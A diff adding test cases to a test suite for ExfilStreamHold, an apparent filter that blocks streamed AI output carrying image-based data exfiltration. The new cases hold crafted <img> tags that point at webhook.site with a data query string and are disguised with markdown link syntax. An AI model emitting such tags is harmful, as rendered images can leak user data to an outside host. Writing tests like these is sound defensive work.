@@ -85,6 +85,13 @@ describe('ExfilStreamHold', () => {
     expect(run(['[<img alt="a]" src="https://webhook.site/?d=1">'])).toBeNull()
   })
 
+  it('cuts an <img whose attributes contain a whole markdown link', () => {
+    expect(run(['[<img alt="a](x)" src="https://webhook.site/?d=1">'])).toBeNull()
+    expect(run(['[<img src="https://webhook.site/?d=](x)1">'])).toBeNull()
+    expect(run(['[<img alt=]\nsrc="https://webhook.site/?d=1">'])).toBeNull()
+    expect(run(['<img alt="[x](https://example.com/)" src="https://webhook.site/?d=1">'])).toBeNull()
+  })
+
   it('sees an <img that opens across two events', () => {
     const hold = new ExfilStreamHold(isExfil)
     expect(hold.push(anthropic('x <im'))).toBe(anthropic('x <im'))
